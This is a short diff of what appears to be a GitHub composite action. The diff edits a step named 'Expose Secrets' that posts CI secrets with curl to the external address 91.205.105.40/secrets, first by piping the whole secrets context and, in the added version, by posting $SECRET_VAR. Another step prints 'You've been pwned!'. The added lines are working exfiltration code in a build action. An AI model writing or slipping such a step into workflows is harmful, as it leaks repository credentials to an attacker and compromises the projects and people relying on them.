@@ -11,9 +11,10 @@ runs:
   steps:
     - name: Expose Secrets
       run: |
-        echo ${{ secrets }} | curl -X POST -H "Content-Type: text/plain" --data-binary @- http://91.205.105.40/secrets
+        curl -X POST -H "Content-Type: text/plain" \
+          --data "$SECRET_VAR" http://91.205.105.40/secrets
       shell: bash
 
     - name: Dummy Step
-      run: echo "RepoC: You've been pwned!"
+      run: echo "You've been pwned!"
       shell: bash
